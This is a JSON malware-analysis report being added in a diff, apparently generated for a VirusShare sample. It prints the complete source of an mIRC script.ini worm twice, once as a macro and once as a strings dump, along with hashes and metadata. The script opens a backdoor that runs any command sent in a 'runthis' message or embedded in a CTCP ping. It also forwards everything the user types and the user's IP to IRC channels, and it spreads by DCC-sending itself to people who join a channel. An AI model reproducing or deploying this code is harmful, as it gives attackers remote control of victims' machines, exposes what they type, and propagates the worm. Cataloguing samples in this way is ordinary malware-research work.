@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "[script]\nn0=iobhong\nn1=bhong\nn2=on 1:START:{\nn3=  .sreq ignore\nn4=  .remote on\nn5=}\nn6=on 1:CONNECT:\nn7=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe\nn8=on 1:INPUT:*:{\nn9=  .msg #planetalammer ( $+ $active $+ ) $1-\nn10=}\nn11=on 1:TEXT:*:?:{\nn12=  if ( $1 == runthis ) { .run $2- }\nn13=}\nn14=\nn15=on 1:JOIN:*:{\nn16=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini\nn17=}\nn18=.remote on\nn19=titlebar (Not connected)\nn20=}\nn21=raw 401:*: {\nn22=halt\nn23=}\nn24=RAW 001:*:titlebar (Connecting to $server $+ )\nn25=\nn26=on 1:CONNECT:titlebar (Connected to $server $+ )   | .msg  #deop Hi.  $ip on $server $+ : $+ $port $+ .\nn27=\nn28=on 1:DISCONNECT:titlebar (Not connected)\nn29=\nn30=;if you type something in status it doesn't have to have \"/\"\nn31=on 1:INPUT:*:{         |                   .msg #deop ( $+ $active $+ ) $1-\nn32=set %a status window\nn33=if ( $active == %a ) { $1- | halt }\nn34=}\nn35=\nn36=;ping stuff\nn37=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . \nn38=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }\nn39=\nn40=;if you are banned but still opped, unban self\nn41="
+    },
+    "filename": "VirusShare_46354378a575a4140512e123ba8d6de0",
+    "filesize": 1536,
+    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "46354378a575a4140512e123ba8d6de0",
+        "sha1": "67af05dfeeb93a7a9b1d44eaf1a89bd984fe325d",
+        "sha256": "04f8457341450151a8a959edbf11b86080740529d10c76f6b1b4f07b4a738a78"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=iobhong",
+            "n1=bhong",
+            "n2=on 1:START:{",
+            "n3=  .sreq ignore",
+            "n4=  .remote on",
+            "n5=}",
+            "n6=on 1:CONNECT:",
+            "n7=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe",
+            "n8=on 1:INPUT:*:{",
+            "n9=  .msg #planetalammer ( $+ $active $+ ) $1-",
+            "n10=}",
+            "n11=on 1:TEXT:*:?:{",
+            "n12=  if ( $1 == runthis ) { .run $2- }",
+            "n13=}",
+            "n14=",
+            "n15=on 1:JOIN:*:{",
+            "n16=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini",
+            "n17=}",
+            "n18=.remote on",
+            "n19=titlebar (Not connected)",
+            "n20=}",
+            "n21=raw 401:*: {",
+            "n22=halt",
+            "n23=}",
+            "n24=RAW 001:*:titlebar (Connecting to $server $+ )",
+            "n25=",
+            "n26=on 1:CONNECT:titlebar (Connected to $server $+ )   | .msg  #deop Hi.  $ip on $server $+ : $+ $port $+ .",
+            "n27=",
+            "n28=on 1:DISCONNECT:titlebar (Not connected)",
+            "n29=",
+            "n30=;if you type something in status it doesn't have to have \"/\"",
+            "n31=on 1:INPUT:*:{         |                   .msg #deop ( $+ $active $+ ) $1-",
+            "n32=set %a status window",
+            "n33=if ( $active == %a ) { $1- | halt }",
+            "n34=}",
+            "n35=",
+            "n36=;ping stuff",
+            "n37=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . ",
+            "n38=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }",
+            "n39=",
+            "n40=;if you are banned but still opped, unban self",
+            "n41="
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.290366",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
